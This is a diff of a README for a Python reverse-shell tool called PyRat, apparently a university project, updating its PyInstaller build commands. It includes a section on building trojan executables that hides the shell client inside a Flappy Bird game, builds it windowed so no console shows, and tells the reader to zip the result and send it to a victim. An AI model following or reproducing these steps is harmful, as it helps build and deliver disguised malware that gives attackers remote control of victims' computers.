@@ -20,13 +20,13 @@ University of the Philippines Diliman
 
 - Install required Python packages.
 
-   ```
+   ```bat
    pip install -r packages.txt
    ```
 
 - Run the server script.
 
-   ```
+   ```bat
    python server.py --port 58777
    ```
 
@@ -47,15 +47,14 @@ University of the Philippines Diliman
 
 - Server script
 
-  ```bash
-  pyinstaller server.py -F -y -i shell.ico --name "RevShellServer" --specpath "build/" 
+  ```bat
+  pyinstaller server.py -F -y -i assets/icons/shell.ico --distpath "dist/PyRat" --name "PyRatServer"
   ```
   
 - Client script, use the `windowed` option to prevent the script from launching a command window
 
-  ```bash
-  pyinstaller client.py -F -y -i gear.ico --name "RevShellClient" --specpath "build/"
-  pyinstaller client.py -F -y -i gear.ico --name "RevShellPayload" --specpath "build/" --windowed
+  ```bat
+  pyinstaller client.py -F -y -i assets/icons/gear.ico --distpath "dist/PyRat" --name "PyRatClient"
   ```
 
 ## Building Trojan Executables (Windows)
@@ -74,35 +73,17 @@ payload = subprocess.Popen('engine', shell = True, stdout= None, stderr = None, 
 ```
 
 
-### Building the Game Package Using cx_Freeze
+### Building the Game Package
 
-This is a snippet of our setup script defining the executable binaries to be compiled:
 
-```python
-executables = [
-    cx_Freeze.Executable(
-        script          = 'flappy.py',
-        base            = 'Win32GUI', 
-        targetName      = 'flappybird.exe',
-        icon            = 'assets/icons/flappy.ico',
-        shortcutName    = 'FlappyBird'
-    ),
-    cx_Freeze.Executable(
-        script          = 'client.py',
-        base            = 'Win32GUI', 
-        targetName      = 'engine.exe',
-        icon            = 'assets/icons/gear.ico'
-    )
-]
+Run `pyinstaller` and copy the assets folder to the destination:
+
+```bat
+pyinstaller flappy.py -F -y -i assets/icons/flappy.ico --distpath "dist/FlappyBird" --name "flappybird" --windowed
+xcopy "assets" "dist/FlappyBird/assets" /E /S /Y**
 ```
 
-Then execute the build script:
-
-```
-python setup.py build
-```
-
-Once done, we can now see our Trojan application inside the `build/` directory. All there's left to do is to change the configuration settings, compress this to a **zip** file and send it to a victim.
+Once done, we can now see our Trojan application inside the `build/FlappyBird` directory. All there's left to do is to change the configuration settings, compress this to a **zip** file and send it to a victim.
 
 ```
 .
